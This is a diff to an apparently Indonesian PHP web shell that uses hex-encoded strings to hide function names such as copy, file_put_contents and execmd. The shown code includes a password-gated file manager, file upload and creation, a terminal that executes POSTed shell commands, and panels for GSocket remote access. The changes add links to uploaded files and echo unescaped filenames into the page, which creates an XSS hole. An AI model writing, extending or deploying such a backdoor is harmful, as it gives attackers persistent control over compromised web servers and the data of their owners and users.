@@ -30,7 +30,7 @@ if(!isset(${"\x5f\x53\x45\x53\x53\x49\x4f\x4e"}["\x6c\x6f\x67\x67\x65\x64\x5f\x6
             body{background:#0d0d0d;color:#eee;font-family:monospace;text-align:center;padding-top:100px;}
             input{padding:6px;margin:5px;border-radius:4px;border:none;}
             input[type=password]{width:200px;}
-            input[type=submit]{background:#7d3c98;color:#fff;cursor:pointer;}
+            input[type=submit]{background:#f1c40f;color:#fff;cursor:pointer;}
             .msg{color:#e74c3c;margin-top:10px;}
         </style>
     </head>
@@ -101,11 +101,13 @@ $paths = explode("/",$path);
 $search = isset($_GET['search']) ? strtolower($_GET['search']) : "";
 $msg = "";
 $msgType = "";
-
 if(isset($_FILES['file'])){
     $dest = $path.'/'.$_FILES['file']['name'];
     if("\x63\x6f\x70\x79"($_FILES['file']['tmp_name'],$dest)){
-        $msg = "Upload Berhasil: ".$_FILES['file']['name'];
+        // Buat URL langsung ke file (relative dari domain)
+        $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $dest);
+        $fileUrl = $relativePath;
+        $msg = "Upload Berhasil: <a href='".$fileUrl."' target='_blank'>".$_FILES['file']['name']."</a>";
         $msgType = "\x73\x75\x63\x63\x65\x73\x73";
     } else {
         $msg = "Upload Gagal!";
@@ -113,8 +115,13 @@ if(isset($_FILES['file'])){
     }
 }
 if(isset($_POST["\x6e\x65\x77\x66\x69\x6c\x65"])){
-    if("\x66\x69\x6c\x65\x5f\x70\x75\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"($path.'/'.$_POST["\x6e\x65\x77\x66\x69\x6c\x65"],"")){
-        $msg = "File dibuat: ".$_POST["\x6e\x65\x77\x66\x69\x6c\x65"];
+    $newFile = $path.'/'.$_POST["\x6e\x65\x77\x66\x69\x6c\x65"];
+    $result = "\x66\x69\x6c\x65\x5f\x70\x75\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"($newFile,"");
+    if($result !== false){
+        // Buat URL langsung ke file (relative dari domain)
+        $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $newFile);
+        $fileUrl = $relativePath;
+        $msg = "File dibuat: <a href='".$fileUrl."' target='_blank'>".$_POST["\x6e\x65\x77\x66\x69\x6c\x65"]."</a>";
         $msgType = "\x73\x75\x63\x63\x65\x73\x73";
     } else {
         $msg = "Gagal membuat file!";
@@ -130,7 +137,6 @@ if(isset($_POST["\x6e\x65\x77\x66\x6f\x6c\x64\x65\x72"])){
         $msgType = "\x65\x72\x72\x6f\x72";
     }
 }
-
 if(isset($_POST["\x64\x65\x6c\x65\x74\x65"])){
     $t=$_POST["\x74\x61\x72\x67\x65\x74"];
     $deleted = false;
@@ -220,16 +226,10 @@ if(isset($_POST["\x75\x6e\x7a\x69\x70"])){
         $msgType = "\x65\x72\x72\x6f\x72";
     }
 }
-
 $terminal_output = "";
 $showTerminal = isset($_POST["\x74\x6f\x67\x67\x6c\x65\x5f\x74\x65\x72\x6d\x69\x6e\x61\x6c"]) ? true : false;
 $showGSocket = isset($_POST["\x73\x68\x6f\x77\x5f\x67\x73\x6f\x63\x6b\x65\x74"]) ? true : false;
 $showMiniSocket = isset($_POST["\x73\x68\x6f\x77\x5f\x6d\x69\x6e\x69\x73\x6f\x63\x6b\x65\x74"]) ? true : false;
-
-// if(isset($_POST["\x65\x78\x65\x63\x6d\x64"])){ 
-//     $terminal_output = exe($_POST["\x63\x6d\x64"]); 
-//     $showTerminal = true;
-// }
 if(isset($_POST["\x65\x78\x65\x63\x6d\x64"])){ 
     $terminal_output = exe($_POST["\x63\x6d\x64"], $path); 
     $showTerminal = true;
@@ -422,8 +422,9 @@ foreach($paths as $id=>$pat){
 </form>
 </div>
 
+<!--  -->
 <?php if($msg): ?>
-<div class="msg-box <?=$msgType?>"><i class="fas fa-<?=$msgType=="\x73\x75\x63\x63\x65\x73\x73"?'check':'exclamation'?>-circle"></i> <?=$msg?></div>
+<div class="msg-box <?=$msgType?>"><i class="fas fa-<?=$msgType=="\x73\x75\x63\x63\x65\x73\x73"?'check':'exclamation'?>-circle"></i> <?php echo $msg; ?></div>
 <?php endif; ?>
 
 <div class="container">
